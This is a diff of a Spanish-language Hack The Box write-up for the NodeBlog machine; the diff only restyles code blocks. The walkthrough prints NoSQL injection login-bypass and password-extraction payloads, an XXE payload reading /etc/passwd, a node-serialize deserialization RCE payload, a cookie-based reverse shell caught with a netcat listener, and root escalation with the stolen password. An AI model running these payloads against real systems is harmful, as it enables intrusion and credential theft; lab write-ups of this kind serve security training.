@@ -198,14 +198,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Aquí podemos tratar de iniciar sesión:</p>
 <p><img src=/images/HTB/NodeBlog/NodeBlog-login.png alt="NodeBlog login"></p>
 <p>Lo primero que podemos probar son credenciales por defecto. Durante el proceso, vemos que el formulario es vulnerable a enumeración de usuarios:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'user=asdf&password=asdf'</span> | <span class=code-dark-green>grep</span> Invalid
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'user=asdf&password=asdf'</span> | <span class=code-dark-green>grep</span> Invalid
             <span class=code-red>Invalid</span> Username
 
 <span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'user=admin&password=asdf'</span> | <span class=code-dark-green>grep</span> Invalid
             <span class=code-red>Invalid</span> Password
 </code></pre></div>
 <p>Y por tanto, sabemos que <code>admin</code> es un usuario válido. Entonces, podemos realizar un ataque de fuerza bruta para enumerar más usuarios válidos:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/names.txt -u http://10.10.11.139:5000/login -d <span class=code-dark-yellow>'user=FUZZ&password=x'</span> -mr <span class=code-dark-yellow>'Invalid Password'</span> -H <span class=code-dark-yellow>'Content-Type: application/x-www-form-urlencoded'</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/names.txt -u http://10.10.11.139:5000/login -d <span class=code-dark-yellow>'user=FUZZ&password=x'</span> -mr <span class=code-dark-yellow>'Invalid Password'</span> -H <span class=code-dark-yellow>'Content-Type: application/x-www-form-urlencoded'</span>
 admin                   [Status: <span class=code-dark-green>200</span>, Size: 1040, Words: 151, Lines: 30]
 </code></pre></div>
 <p>Pero parece que no hay más usuarios comunes a parte de <code>admin</code>.</p>
@@ -213,11 +213,11 @@ admin                   [Status: <span class=code-dark-green>200</span>, Size: 1
 <p>Después de tratar de inyectar código SQL y probar contraseñas comunes, uno puede pensar que el servidor está utilizando MongoDB (<em>stack</em> MEAN: MongoDB, Express.js, Angular, Node.js). Por tanto, podemos buscar <em>payloads</em> de inyección NoSQL.</p>
 <p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings>PayloadsAllTheThings</a> tiene muchos <em>payloads</em>, algunos con <code>application/x-www-form-urlencoded</code> y otros utilizando <code>application/json</code>.</p>
 <p>Podemos probar con <code>application/x-www-form-urlencoded</code> (como en los comandos anteriores con <code>curl</code>), pero ninguno funciona. Cambiemos entonces el tipo de contenido y verifiquemos que todo funciona bien:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":"admin","password":"asdf"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":"admin","password":"asdf"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid
             <span class=code-red>Invalid</span> Password
 </code></pre></div>
 <p>Perfecto, ahora podemos añadir operadores de MongoDB:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":{"$eq":"admin"},"password":"asdf"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":{"$eq":"admin"},"password":"asdf"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid
             <span class=code-red>Invalid</span> Password
 
 <span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":{"$ne":"admin"},"password":"asdf"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid
@@ -227,7 +227,7 @@ admin                   [Status: <span class=code-dark-green>200</span>, Size: 1
             <span class=code-red>Invalid</span> Password
 </code></pre></div>
 <p>Utilizando el siguiente <em>payload</em>, podemos saltarnos el formulario de inicio de sesión y obtener una <em>cookie</em> de sesión válida:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -isd <span class=code-dark-yellow>'{"user":"admin","password":{"$regex":""}}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -isd <span class=code-dark-yellow>'{"user":"admin","password":{"$regex":""}}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span>
 HTTP/1.1 200 OK
 <span class=code-white>X-Powered-By</span>: Express
 <span class=code-white>Set-Cookie</span>: auth=%7B%22user%22%3A%22admin%,%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D; Max-Age=900; Path=/; HttpOnly
@@ -241,13 +241,13 @@ HTTP/1.1 200 OK
 ...
 </code></pre></div>
 <p>Además, podemos extraer la contraseña de <code>admin</code> utilizando el operador <code>$regex</code>. Para extraer la longitud de la contraseña, podemos incrementar el número hasta que coincida (no hay salida en el segundo comando ya que no hay mensaje de error):</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":"admin","password":{"$regex":"^.{24}$"}}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":"admin","password":{"$regex":"^.{24}$"}}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid
             <span class=code-red>Invalid</span> Password
 
 <span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":"admin","password":{"$regex":"^.{25}$"}}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid
 </code></pre></div>
 <p>Después, podemos añadir caracteres hasta que la expresión regular coincida y finalmente obtener la contraseña. Para automatizar el proceso, utilicé un <em>script</em> en Bash llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/NodeBlog/nosqli.sh><code>nosqli.sh</code></a>. El <em>script</em> obtiene la longitud de la contraseña y luego la extrae (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/NodeBlog#nosqlish>aquí</a>).</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> nosqli.sh
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> nosqli.sh
 Password length: 25
 Password: IppsecSaysPleaseSubscribe
 </code></pre></div>
@@ -260,7 +260,7 @@ Password: IppsecSaysPleaseSubscribe
 <p>Existe otra funcionalidad que es subir un artículo. Podemos añadir un archivo cualquiera y obtener un error de XML:</p>
 <p><img src=/images/HTB/NodeBlog/NodeBlog-xml.png alt="NodeBlog XML error"></p>
 <p>Entonces, necesitamos subir un documento XML válido, como este:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#242424;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;
 <span class=mtk1>&lt;</span><span class=mtk5>post</span><span class=mtk1>&gt;
 <span class=mtkw>&nbsp;&nbsp;</span><span class=mtk1>&lt;</span><span class=mtk5>title</span><span class=mtk1>&gt;ASDF&lt;/</span><span class=mtk5>title</span><span class=mtk1>&gt;
 <span class=mtkw>&nbsp;&nbsp;</span><span class=mtk1>&lt;</span><span class=mtk5>description</span><span class=mtk1>&gt;&lt;/</span><span class=mtk5>description</span><span class=mtk1>&gt;
@@ -270,7 +270,7 @@ Password: IppsecSaysPleaseSubscribe
 <p>Y vemos que el servidor lo analiza y rellena los campos del formulario para editar el artículo:</p>
 <p><img src=/images/HTB/NodeBlog/NodeBlog-edit.png alt="NodeBlog edit"></p>
 <p>En este punto, podemos efectuar una inyección de Entidad Externa XML (XXE), esto es, añadir una entidad que tome el contenido de un archivo y lo ponga en un elemento del documento XML. Un simple <em>payload</em> XXE sería el siguiente:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#242424;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;
 <span class=mtk1>&lt;!</span><span class=mtk5>DOCTYPE</span> <span class=mtk9>foo</span> <span class=mtk1>[&lt;!</span><span class=mtk5>ENTITY</span> <span class=mtk9>xxe</span> <span class=mtk5>SYSTEM</span> <span class=mtk4>"</span><span class="mtk4 detected-link">file:///etc/passwd</span><span class=mtk4>"</span><span class=mtk1>&gt;]</span> <span class=mtk1>&gt;
 <span class=mtk1>&lt;</span><span class=mtk5>post</span><span class=mtk1>&gt;
 <span class=mtkw>&nbsp;&nbsp;</span><span class=mtk1>&lt;</span><span class=mtk5>title</span><span class=mtk1>&gt;ASDF&lt;/</span><span class=mtk5>title</span><span class=mtk1>&gt;
@@ -282,9 +282,9 @@ Password: IppsecSaysPleaseSubscribe
 <p><img src=/images/HTB/NodeBlog/NodeBlog-xxe.png alt="NodeBlog XXE"></p>
 <p>Con esta vulnerabilidad, podemos leer archivos del servidor si conocemos la ruta absoluta. Para explotarla, utilicé un <em>script</em> en Python llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/NodeBlog/xxe.py><code>xxe.py</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/NodeBlog#xxepy>aquí</a>).</p>
 <p>Tenemos la ruta base del servidor (<code>/opt/blog</code>), mostrada en un mensaje de error. El archivo principal de una aplicación de Node.js suele ser: <code>app.js</code>, <code>main.js</code>, <code>script.js</code>, <code>index.js</code> o <code>server.js</code>. Podemos probar estos archivos y ver que <code>server.js</code> existe:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>pyhton3</span> xxe.py /opt/blog/server.js
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pyhton3</span> xxe.py /opt/blog/server.js
 </code></pre></div>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#242424;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class="mtk7 mtki">const</span> <span class=mtk8>express</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'express'</span><span class=mtk1>)</span>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">const</span> <span class=mtk8>express</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'express'</span><span class=mtk1>)</span>
 <span class="mtk7 mtki">const</span> <span class=mtk1>mongoose</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'mongoose'</span><span class=mtk1>)</span>
 <span class="mtk7 mtki">const</span> <span class=mtk1>Article</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'./models/article'</span><span class=mtk1>)</span>
 <span class="mtk7 mtki">const</span> <span class=mtk1>articleRouter</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'./routes/articles'</span><span class=mtk1>)</span>
@@ -336,18 +336,18 @@ Password: IppsecSaysPleaseSubscribe
 <p>Podríamos extraer más códigos fuente a partir del principal (por ejemplo, <code>/opt/blog/routes/login.js</code>, <code>/opt/blog/routes/articles.js</code>, <code>/opt/blog/models/user.js</code> y <code>/opt/blog/models/article.js</code>). Sin embargo, con <code>server.js</code> basta para continuar.</p>
 <h2 id=encontrando-una-deserialización-insegura>Encontrando una deserialización insegura</h2>
 <p>El archivo JavaScript anterior utiliza <code>node-serialize</code>, que es un módulo de Node.js utilizado para serializar y deserializar documentos JSON. Se sabe que este módulo es vulnerable a ejecución remota de comandos (RCE) mediante el método <code>unserialize</code>. Podemos encontrar más información al respecto y una sencilla prueba de concepto en <a href=https://security.snyk.io/vuln/npm:node-serialize:20170208>snyk.io</a> (CVE-2017-5941). Necesitamos introducir un <em>payload</em> como este:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#242424;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class="mtk7 mtki">const</span> <span class=mtk1>serialize</span> <span class=mtk5>=</span> <span class=mtk7>require</span><span class=mtk1>(</span><span class=mtk4>'node-serialize'</span><span class=mtk1>)</span>
+<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">const</span> <span class=mtk1>serialize</span> <span class=mtk5>=</span> <span class=mtk7>require</span><span class=mtk1>(</span><span class=mtk4>'node-serialize'</span><span class=mtk1>)</span>
 <span class="mtk7 mtki">const</span> <span class=mtk1>payload</span> <span class=mtk5>=</span> <span class=mtk4>`{"rce":"_$$ND_FUNC$$_function()</span> <span class=mtk4>{</span> <span class=mtk4>require(</span><span class=mtk4>'child_process'</span><span class=mtk4>).exec(</span><span class=mtk4>'ls'</span><span class=mtk4>)</span> <span class=mtk4>}()"}`</span>
 <span class=mtk1>serialize.</span><span class=mtk8>unserialize</span><span class=mtk1>(payload)</span>
 </code></pre></div>
 <p>El método <code>unserialize</code> se utiliza sobre la <em>cookie</em> de sesión para verificar que la firma es correcta. Por tanto, podemos añadir el <em>payload</em> a la <em>cookie</em>, ya que está en formato JSON (con codificación URL).</p>
 <p>Para esta tarea, desarrollé un <em>script</em> en Node.js que se autentica y modifica la <em>cookie</em> de sesión para introducir el <em>payload</em> y obtener una <em>reverse shell</em>. El <em>script</em> se llama <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/NodeBlog/serialize-rce.js><code>serialize-rce.js</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/NodeBlog#serialize-rcejs>aquí</a>).</p>
 <p>Utilizando este <em>script</em>, somos capaces de acceder a la máquina como <code>admin</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>node</span> serialize-rce.js 10.10.17.44 4444
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>node</span> serialize-rce.js 10.10.17.44 4444
 [+] Login successful
 [+] RCE completed
 </code></pre></div>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom"><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
@@ -370,12 +370,12 @@ admin@nodeblog:/opt/blog$ stty rows 50 columns 158
 </code></pre></div>
 <h2 id=escalada-de-privilegios>Escalada de privilegios</h2>
 <p>Una vez como <code>admin</code>, podemos ir a su directorio personal y capturar la <em>flag</em> <code>user.txt</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom">admin@nodeblog:/opt/blog$ cd
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>admin@nodeblog:/opt/blog$ cd
 admin@nodeblog:~$ cat user.txt
 7d30843b9570b5efd388820002409de2
 </code></pre></div>
 <p>Además, el archivo <code>.bash_history</code> no está redirigido a <code>/dev/null</code>, por lo que podemos ver los últimos comandos ejecutados por <code>admin</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom">admin@nodeblog:~$ ls -la --time-style=+
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>admin@nodeblog:~$ ls -la --time-style=+
 total 36
 drwxrwxrwx 1 admin admin   220  <span class="code-bg-green code-blue">.</span>
 drwxr-xr-x 1 root  root     10  <span class=code-blue>..</span>
@@ -403,7 +403,7 @@ node server.js
 sudo su
 </code></pre></div>
 <p>Como está utilizando <code>sudo su</code>, podemos deducir que este usuario puede ser <code>root</code> utilizando <code>sudo</code>. Si utilizamos la contraseña extraída anteriormente de MongoDB, conseguimos ser <code>root</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class="hljs-custom hljs language-custom">admin@nodeblog:~$ sudo su
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>admin@nodeblog:~$ sudo su
 [sudo] password for admin:
 root@nodeblog:/home/admin# cd
 root@nodeblog:~# cat root.txt
